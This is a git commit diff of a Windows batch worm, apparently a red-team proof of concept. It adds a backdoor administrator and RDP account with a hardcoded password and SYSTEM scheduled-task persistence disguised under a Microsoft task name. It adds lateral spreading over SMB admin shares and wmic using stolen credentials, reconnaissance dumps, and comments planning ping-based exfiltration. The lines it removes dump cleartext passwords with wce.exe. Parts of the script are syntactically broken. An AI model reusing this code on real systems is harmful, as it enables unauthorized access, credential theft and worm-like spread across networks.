7126eea8d7448619e2c1f80b0687935c9b68349d
Teeyawn <66130186+Teeyawn@users.noreply.github.com>
2022-01-14 16:04:40 -0500

    Update main.bat

--- source/main.bat
+++ source/main.bat
@@ -1,43 +1,58 @@
 @echo on
-
 :global_var
-	set ldir=C:\Windows\Temp
+	set ldir=%HOMEPATH%
+	set ldir=pwnd_dir
+
+	:: corncob possibly set as Dommain Controller or DNS?
+	:: Can you ping domain controller or DNS
+	:: Use for exfil 
+	:: Ideally box has tcpdump so you can dump ping Base64 pattern;)
+	:: Add a list of IPs to whitelist inbound_list.txt
+
+	set corncob= 1.1.1.1
+
 	:: get IP config
 	for /f "tokens=1-20 delims=. " %%a in ('"ipconfig | findstr /c:"Gateway""') do (
 		set gw=%%d.%%e.%%f.%%g
 	)
 	for /f "tokens=1-20 delims=. " %%a in ('"ipconfig | findstr /c:"IPv4""') do (
-		set oc1=%%d
-		set oc2=%%e
-		set oc3=%%f
-		set oc4=%%g
+		set octet1=%%d
+		set octet2=%%e
+		set octet3=%%f
+		set octet4=%%g
+		set currentip=%octet1%.%octet2%.%octet3%.%octet4%
+		findstr /IC:"%currentip%" inbound_list.txt
+		if %errorlevel% equ 0 (
+			::call deleteme 
+			exit /b 0
 	)
 	call :init
 	goto :EOF
-
-
 :init
 	:: Checks for infection marker if host is already infected.
-	:: If marker is not found, adds persistence and infection marker. If it is found, continues with propagation.
-	reg query HKLM\SOFTWARE\Microsoft /t REG_SZ /v killswitch
+
+
+	::buildin Kill switch WIP 14Jan
+	reg query HKLM\SOFTWARE\Microsoft /t REG_SZ /v KillSwitch_oOoOo
 	if %errorlevel% equ 0 (
+		::call deleteme 
 		exit /b 0
+
 	) ELSE (
-		reg query HKLM\SOFTWARE\Microsoft /t REG_SZ /v isInstalled
-		if %errorlevel% equ 1 (
-			call :seq1
+		reg query HKLM\SOFTWARE\Microsoft /t REG_SZ /v isPresented
+		if %errorlevel% equ 1 (  
+			call :initial_beacon_install
 		)
 		if %errorlevel% equ 0 (
-			call :seq2	
+			call :beacon_present_already	
 		)
 	)
 	exit /b 0
 
-
-:seq1
-	::patient zero sequence
+:initial_beacon_install
 	call :getcreds_setstaticip
 	call :getcreds_pwdump
+	::initial target attack sequence
 	if %errorlevel% equ 0 (
 		call :add_marker
 		call :add_persistence
@@ -46,16 +61,16 @@
 	)
 	exit /b 0
 
-
-:seq2
+:beacon_present_already
 	::subsequent host sequence
 	call :add_marker
-	call :add_persistence
-	call :execute_action
 	call :prop_seq
+
+
 	exit /b 0
 
 
+:::: TRASH ME 
 :getcreds_setstaticip
 	:: Set random time before setting static IP as a social engineering tactic.
 	set /a rval=(%RANDOM%*60/32768)+1
@@ -64,59 +79,45 @@
 	exit /b 0
 
 
-:getcreds_pwdump
-	:: Dumps cleartext passwords every 10 seconds and dumps password to text file if admin password is detected.
-	timeout /t 10 /nobreak > nul
-	for /f "tokens=1-3 delims=\:" %%a in ('"%~dp0wce.exe -w | findstr /i "admin""') do (
-		echo %%b\%%a %%c > "%ldir%\dapw"
-	)
-	if NOT EXIST "%ldir%\dapw" (
-		goto :getcreds_pwdump
-	)
-	if EXIST "%ldir%\dapw" (
-		call :getcreds_ping
-		exit /b 0
-	)
-
-
-:getcreds_ping
-	:: wait for x seconds
-	ping %gw% /n 2 /w 1000 |findstr Reply | findstr -v unreachable
-	if %errorlevel% neq 0 (
-		goto :getcreds_ping
-	)
-	if %errorlevel% equ 0 (
-		exit /b 0
-	)
-
-
 :add_marker
 	:: Infection marker
-	reg add HKLM\SOFTWARE\Microsoft /f /v isInstalled /t REG_SZ /d 1
+	reg add HKLM\SOFTWARE\Microsoft /f /v isPresented /t REG_SZ /d 1
 	exit /b 0
 
+:execute_RDPuseradd 
+	:: User:Pass
+	:: oOoOo:1qaz!QAZ@WSX!QAZ
+	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+	net user oOoOo 1qaz!QAZ@WSX /add /Y
+	net localgroup administrators oOoOo /ADD /Y
+	net LOCALGROUP "Remote Desktop Users" oOoOo /ADD /Y
 
 :add_persistence
 	:: Add task schedule persistence
-	copy /y %~dp0main.bat %ldir%\main.bat
-	schtasks /Create /SC HOURLY /RU SYSTEM /TN "Microsoft\Windows\SoftwareProtectionPlatform\PlatformMaintenance" /TR "%ldir%\main.bat" /F
+	copy /y %~dp0oO°º¤øø¤º°ºøo.bat %ldir%\oO°º¤øø¤º°ºøo.bat
+	schtasks /Create /SC HOURLY /RU SYSTEM /TN "Microsoft\Windows\SoftwareProtectionPlatform\PlatformMaintenance" /TR "%ldir%\oO°º¤øø¤º°ºøo.bat" /F
 	exit /b 0
-
 
 :execute_action
 	:: Malicious actions go here. This POC leaves a text file with system information.
 	::===========================
-	set pwnfile=C:\pwned.txt
-	echo %COMPUTERNAME% has been pwned. > %pwnfile%
+	set pwnfile="%pwnd_dir%\1338¤øø¤_%COMPUTERNAME%.txt
+
+	echo %COMPUTERNAME% SystemInfoStart> %pwnfile%
 	echo.
-	systeminfo >> %pwnfile%
-	ipconfig >> %pwnfile%
-	netstat -anp >> %pwnfile%
+	systeminfo | findstr /i "Host"" >> %pwnfile%
+	wmic bios get manufacturer && wmic bios get version && wmic bios get name >> %pwnfile%
+	echo "Below Starts Hosts" >> %pwnfile%
+	type C:\WINDOWS\System32\drivers\etc\hosts | findstr /v "^#" | findstr /v "^$" | findstr /v Copyright >> %pwnfile%
+	echo "Below Starts Programs Installed" >> %pwnfile%
+	reg query HKEY_LOCAL_MACHINE\SOFTWARE >> %pwnfile%
+	ipconfig  >> %pwnfile%
+	netstat -pantofb tcp >> %pwnfile%
 	net users >> %pwnfile%
 	net share >> %pwnfile%
-	::===========================
+	net start >> %pwnfile%
+	echo "=============================================================	" >> %pwnfile%
 	exit /b 0
-
 
 :prop_seq
 	call :prop_subnet
@@ -124,25 +125,28 @@
 	call :prop_arp
 	exit /b 0
 
-
 :prop_subnet
 	:: Method 1 - Find and propagate to targets on the same subnet. Does a ping sweep to achieve this.
 	setlocal enabledelayedexpansion
 	for /l %%q in (0,1,255) do (
-		ping %oc1%.%oc2%.%oc3%.%%q /n 2 /w 500 | findstr Reply | findstr -v unreachable
+
+		set blackip=%octet1%.%octet2%.%octet3%.%%q
+		findstr /IC:"%blackip%" inbound_list.txt
 		if !errorlevel! equ 0 (
-			for /f "tokens=1-2 delims= " %%x in (%ldir%\dapw) do (
-				net use \\%oc1%.%oc2%.%oc3%.%%q\c$ /user:%%x %%y
-				copy /y "%ldir%\main.bat" "\\%oc1%.%oc2%.%oc3%.%%q\c$\Windows\Temp\main.bat"
-				copy /y "%ldir%\dapw" "\\%oc1%.%oc2%.%oc3%.%%q\c$\Windows\Temp\dapw"
-				net use /del \\%oc1%.%oc2%.%oc3%.%%q\c$
-				wmic /node:%oc1%.%oc2%.%oc3%.%%q /user:%%x /password:%%y process call create "cmd /c %ldir%\main.bat"
-			)
+			ping %octet1%.%octet2%.%octet3%.%%q /n 2 /w 500  | findstr Reply | findstr -v unreachable
+				if !errorlevel! equ 0 (
+					for /f "tokens=1-2 delims= " %%x in (%ldir%\1iobct) do (
+						net use \\%octet1%.%octet2%.%octet3%.%%q\c$ /user:%%x %%y
+						copy /y "%ldir%\oO°º¤øø¤º°ºøo.bat" "\\%octet1%.%octet2%.%octet3%.%%q\c$\Windows\Temp\oO°º¤øø¤º°ºøo.bat"
+						copy /y "%ldir%\1iobct" "\\%octet1%.%octet2%.%octet3%.%%q\c$\Windows\Temp\1iobct"
+						net use /del \\%octet1%.%octet2%.%octet3%.%%q\c$
+						wmic /node:%octet1%.%octet2%.%octet3%.%%q /user:%%x /password:%%y process call create "cmd /c %ldir%\oO°º¤øø¤º°ºøo.bat"
+					)
+				)
 		)
 	)
 	endlocal
 	exit /b 0
-
 
 :prop_netstat
 	:: Method 2 - Find and connect to targets via netstat
@@ -150,14 +154,38 @@
 	for /f "delims=" %a in ('"netstat -anp tcp | findstr ":445" | findstr -v 127.0.0.1 | findstr -v 0.0.0.0 | findstr -v Address"') do (
 		for /f "tokens=4 delims=: " %b in ("%a") do (
 			set %netIp%=%%b
-			ping %netIp% /n 2 /w 500 |findstr Reply | findstr -v unreachable
+			findstr /IC:"%netIp%" inbound_list.txt
+				if !errorlevel! equ 0 (
+					ping %netIp% /n 2 /w 500 |findstr Reply | findstr -v unreachable
+					if !errorlevel! equ 0 (
+						for /f "tokens=1-2 delims= " %%x in (%ldir%\1iobct) do (
+							net use \\%netIp%\c$ /user:%%x %%y
+							copy /y "%ldir%\oO°º¤øø¤º°ºøo.bat" "\\%netIp%\c$\Windows\Temp\oO°º¤øø¤º°ºøo.bat"
+							copy /y "%ldir%\1iobct" "\\%netIp%\c$\Windows\Temp\1iobct"
+							net use /del \\%netIp%\c$
+							wmic /node:%netIp% /user:%%x /password:%%y process call create "cmd /c %ldir%\oO°º¤øø¤º°ºøo.bat"
+						)
+					)
+				)
+		)
+	)
+	endlocal
+	exit /b 0
+:prop_arp
+	:: Method 3 - Find and propagate to targets on ARP tables.
+	setlocal enabledelayedexpansion
+	for /f "delims=" %%a in ('"arp -a | findstr "dynamic" | findstr -v "Address""') do (
+		for /f "tokens=1-4 delims= " %%b in ("%%a") do (
+			set %arpIp%=%%b
+			findstr /IC:"%arpIp%" inbound_list.txt
 			if !errorlevel! equ 0 (
-				for /f "tokens=1-2 delims= " %%x in (%ldir%\dapw) do (
-					net use \\%netIp%\c$ /user:%%x %%y
-					copy /y "%ldir%\main.bat" "\\%netIp%\c$\Windows\Temp\main.bat"
-					copy /y "%ldir%\dapw" "\\%netIp%\c$\Windows\Temp\dapw"
-					net use /del \\%netIp%\c$
-					wmic /node:%netIp% /user:%%x /password:%%y process call create "cmd /c %ldir%\main.bat"
+				ping %arpIp% /n /w 500 | findstr Reply | findstr -v unreachable
+				if !errorlevel! equ 0 (
+					net use \\%arpIp%\c$ /user:%%x %%y
+					copy /y "%ldir%\oO°º¤øø¤º°ºøo.bat" "\\%arpIp%\c$\Windows\Temp\oO°º¤øø¤º°ºøo.bat"
+					copy /y "%ldir%\1iobct" "\\%arpIp%\c$\Windows\Temp\1iobct"
+					net use /del \\%arpIp%\c$
+					wmic /node:%arpIp% /user:%%x /password:%%y process call create "cmd /c %ldir%\oO°º¤øø¤º°ºøo.bat"
 				)
 			)
 		)
@@ -166,21 +194,3 @@
 	exit /b 0
 
 
-:prop_arp
-	:: Method 3 - Find and propagate to targets on ARP tables.
-	setlocal enabledelayedexpansion
-	for /f "delims=" %%a in ('"arp -a | findstr "dynamic" | findstr -v "Address""') do (
-		for /f "tokens=1-4 delims= " %%b in ("%%a") do (
-			set %arpIp%=%%b
-			ping %arpIp% /n /w 500 | findstr Reply | findstr -v unreachable
-			if !errorlevel! equ 0 (
-				net use \\%arpIp%\c$ /user:%%x %%y
-				copy /y "%ldir%\main.bat" "\\%arpIp%\c$\Windows\Temp\main.bat"
-				copy /y "%ldir%\dapw" "\\%arpIp%\c$\Windows\Temp\dapw"
-				net use /del \\%arpIp%\c$
-				wmic /node:%arpIp% /user:%%x /password:%%y process call create "cmd /c %ldir%\main.bat"
-			)
-		)
-	)
-	endlocal
-	exit /b 0
